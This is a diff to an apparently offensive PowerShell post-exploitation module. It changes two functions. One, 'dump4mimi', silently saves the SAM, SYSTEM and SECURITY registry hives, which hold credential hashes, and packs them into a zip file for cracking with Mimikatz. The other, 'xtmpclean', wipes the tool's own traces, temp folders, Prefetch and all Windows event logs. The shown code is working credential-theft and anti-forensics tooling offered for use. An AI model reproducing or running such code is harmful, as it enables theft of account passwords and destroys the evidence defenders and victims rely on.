@@ -82,22 +82,19 @@ Export-ModuleMember -Function getwifipass
 Set-Alias -Name getwifipass -Value getwifipass
 
 
-$WinRARPath = "C:\Program Files\WinRAR\Rar.exe"
+
 function dump4mimi {
-    $cmdCommand = "reg save HKLM\sam $env:TEMP\sam && reg save HKLM\system $env:TEMP\system && reg save HKLM\SECURITY $env:TEMP\security && exit"
+    $cmdCommand = "reg save HKLM\sam $env:userprofile\sam && reg save HKLM\system $env:userprofile\system && reg save HKLM\SECURITY $env:userprofile\security && exit"
     Start-Process cmd.exe -ArgumentList "/c $cmdCommand" -WindowStyle Hidden
     Clear-Host
     Start-Sleep -Seconds 1.5
-    Clear-Host
     Set-Location $env:TEMP
-    $soubory = @("sam", "security", "system")
-    $rarArchiv = "dump4mimi.rar"
-    & $WinRARPath a -ep1 $rarArchiv $soubory
+    Compress-Archive "$env:userprofile\sam","$env:userprofile\security","$env:userprofile\system" -DestinationPath "$env:userprofile\d4m.zip"
     Start-Sleep -Seconds 0.5
     Clear-Host
-    Remove-Item "$env:TEMP\sam" -Force
-    Remove-Item "$env:TEMP\security" -Force
-    Remove-Item "$env:TEMP\system" -Force
+	Remove-Item -Path "$env:userprofile\sam" -force -ErrorAction SilentlyContinue
+	Remove-Item -Path "$env:userprofile\system" -force -ErrorAction SilentlyContinue
+	Remove-Item -Path "$env:userprofile\security" -force -ErrorAction SilentlyContinue
     Clear-Host
 }
 Export-ModuleMember -Function dump4mimi
@@ -239,11 +236,14 @@ Export-ModuleMember -Function persistence-tskschld
 Set-Alias -Name "persistence-tskschld" -Value persistence-tskschld
 
 function xtmpclean {
-del "$env:userprofile\AppData\Local\Temp\*.*" -force -ErrorAction SilentlyContinue
-Remove-Item -Path "$env:userprofile\AppData\Local\Temp\*" -Force -Recurse -ErrorAction SilentlyContinue
-cd $env:userprofile
+Remove-Item -Path "$env:userprofile\d4m*" -force -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:userprofile\levia*" -force -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:userprofile\xlg*" -force -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Temp\*" -Force -Recurse -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Prefetch\*" -Force -Recurse -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\System32\winevt\Logs\*" -Force -ErrorAction SilentlyContinue
+clear
 }
 Export-ModuleMember -Function xtmpclean
 Set-Alias -Name xtmpclean -Value xtmpclean
-
-
